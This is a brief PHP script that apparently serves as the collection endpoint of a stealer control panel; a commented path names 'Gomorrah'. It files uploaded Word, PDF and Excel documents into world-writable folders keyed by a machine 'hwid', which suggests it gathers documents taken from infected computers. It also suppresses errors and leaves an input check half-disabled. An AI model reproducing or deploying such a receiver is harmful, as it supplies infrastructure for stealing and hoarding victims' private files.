<?php
error_reporting(0);
//include("config.php");

$hwid = $_GET['hwid'];

if(isset($hwid)) {
    
    if (!preg_match("/^[-a-zA-Z-0-9]*$/",$hwid)) {
						
      //  exit();
         
      }else{
        //$pwd = "C:/xampp/htdocs/Gomorrah/upload/";
        
        $pwd = getcwd() . "/upload/";
        if (!is_dir($pwd.$hwid)) {
          mkdir($pwd.$hwid, 0777);      
        }
        $folder = "/Documents/";
		if (!is_dir($pwd.$hwid.$folder)) {
          mkdir($pwd.$hwid.$folder, 0777);      
        }
		
        $allowed_extensions = array("doc","docx","pdf","xlsx");
        $temp = explode(".", $_FILES["file"]["name"]);
        $file_extension = end($temp);
        
        if (in_array($file_extension, $allowed_extensions)) 
        {
            $destination = "upload/$hwid/$folder" . basename($_FILES['file']['name']);
            move_uploaded_file($_FILES["file"]["tmp_name"], $destination);
            //echo realpath("upload/" . $_FILES["file"]["name"]); 
        }
                                
          //echo  "allowed :)";
       

  }
    


}
					
	
							
							
?>